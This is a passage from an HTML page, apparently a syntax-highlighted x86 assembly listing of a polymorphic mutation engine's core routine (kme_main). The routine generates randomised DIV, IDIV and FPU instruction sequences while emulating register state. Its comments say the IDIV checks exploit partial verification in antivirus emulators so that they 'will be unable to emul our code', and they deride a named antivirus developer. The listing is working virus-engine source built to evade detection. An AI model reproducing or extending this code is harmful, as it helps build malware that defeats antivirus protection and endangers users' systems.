                        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@md_done</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0F7h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc5">@@x_idiv</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_DIV</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@md_init</span><span class="sc0">
                        </span><span class="sc1">;; check if IDIV avail</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@can_idiv</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc6">idiv</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@md_done</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8F7h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orahR1_stosw</span><span class="sc0">

</span><span class="sc1">; action: IDIV parameters checking (partial emulation, unsigned)</span><span class="sc0">
</span><span class="sc1">; input: EDX:EAX, ECX</span><span class="sc0">
</span><span class="sc1">; output: CF</span><span class="sc0">
</span><span class="sc1">; * all AV emulators performs only partial verification at this step,</span><span class="sc0">
</span><span class="sc1">; * and skips some good IDIVs. So, they will be unable to emul our code.</span><span class="sc0">
</span><span class="sc1">; * Seems such defective programmers as V.Bogdanov has problems coding it.</span><span class="sc0">

</span><span class="sc5">@@can_idiv</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@idiv_err</span><span class="sc0">
                        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">@@g1</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">@@g1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">jge</span><span class="sc0">     </span><span class="sc5">@@g2</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@g2</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; d</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; m</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">
</span><span class="sc5">@@divcycle</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; d &lt;&lt;= 1</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@idiv_err</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; x &lt;&lt;= 1</span><span class="sc0">
                        </span><span class="sc6">rcl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">rcl</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; m = (m &lt;&lt; 1) | x.bit[i]</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@cmpsub</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; if (m &gt;= y)</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@@cmpsubok</span><span class="sc0">
</span><span class="sc5">@@cmpsub</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; m -= y</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; d |= 1</span><span class="sc0">
</span><span class="sc5">@@cmpsubok</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@divcycle</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@idiv_err</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@idiv_err</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">@@idiv_err</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; real super-puper...</span><span class="sc0">

</span><span class="sc5">@@x_fpu</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">testcmd2</span><span class="sc0"> </span><span class="sc5">CMD2_FPU</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">in_subroutine</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; avoid FPU stack overflow</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">fpustack</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; max FPU stack</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">fpuinit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@alredyinit</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">fpuinit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DB9Bh</span><span class="sc0">   </span><span class="sc1">; finit (wait+fninit)</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc7">finit</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">fpustack</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
</span><span class="sc5">@@alredyinit</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; push reg2</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04DBh</span><span class="sc0">    </span><span class="sc1">; fild dword ptr [esp]</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">fpustack</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@cos</span><span class="sc0">

</span><span class="sc5">@@sin</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FED9h</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc7">fsin</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@fpu_done</span><span class="sc0">

</span><span class="sc5">@@cos</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFD9h</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc7">fcos</span><span class="sc0">
</span><span class="sc5">@@fpu_done</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1CD9h</span><span class="sc0">    </span><span class="sc1">; fstp dword ptr [esp]</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">fpustack</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; pop reg1</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">kme_main</span><span class="sc0">                </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">kme_end</span><span class="sc4">:</span><span class="sc0">
</span></div></body>
</html>
